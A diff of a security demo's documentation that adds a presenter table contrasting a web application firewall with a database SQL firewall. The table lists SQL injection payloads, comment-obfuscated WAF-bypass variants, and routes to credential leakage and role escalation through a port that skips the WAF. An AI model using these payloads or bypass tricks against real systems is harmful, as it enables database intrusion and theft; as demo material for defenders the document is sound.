@@ -416,9 +416,20 @@ WAF_LB_URL=http://<lb_public_ip> sudo -E bash scripts/setup-waf-port80-redirect.
 
 **Demo contrast:** `:3001` direct bypasses WAF (SQL Firewall only); `<lb_public_ip>/` shows edge blocking (**403**) for standard UI payloads.
 
-#### WAF vs SQL Firewall differentiation (Attack Point 2)
+#### WAF vs SQL Firewall differentiation (all attack tabs)
 
-Three-layer presenter script on **Institutional Transaction Lookup** (Transaction History tab):
+Presenter pattern on **`http://<lb_public_ip>/`**: canonical payload → **403** (WAF) → bypass payload from secondary UI hint → **200** (DB) → Aegis Vault **:3000** shows SQL Firewall violation.
+
+| Tab | Screen | Canonical (WAF **403**) | WAF bypass (LB **200**) |
+|-----|--------|-------------------------|-------------------------|
+| Market | Lux-Asset Search (step 1 only) | `' OR '1'='1` | `'/**/OR/**/'1'='1` (hint: “WAF bypass step 1”) |
+| Transactions | Ledger lookup | `x' OR user_id<>1 --` | `/**/OR/**/REGEXP_LIKE` / `HEXTORAW` (hint line 2) |
+| Statement | Tax Institution ID | `0 UNION SELECT …` | **No bypass** — use `:3001` for credential leak (UI fallback hint) |
+| Bulk | Batch note | `; UPDATE users …` | **No bypass** — use `:3001` for role escalation (UI fallback hint) |
+
+Market steps 2–3 (UNION / `user_tables` / `user_tab_columns`) remain **WAF-blocked** on the LB URL; use `:3001` for full recon ladder.
+
+**Transaction History** three-layer script:
 
 | Step | URL | Payload | Expected |
 |------|-----|---------|----------|
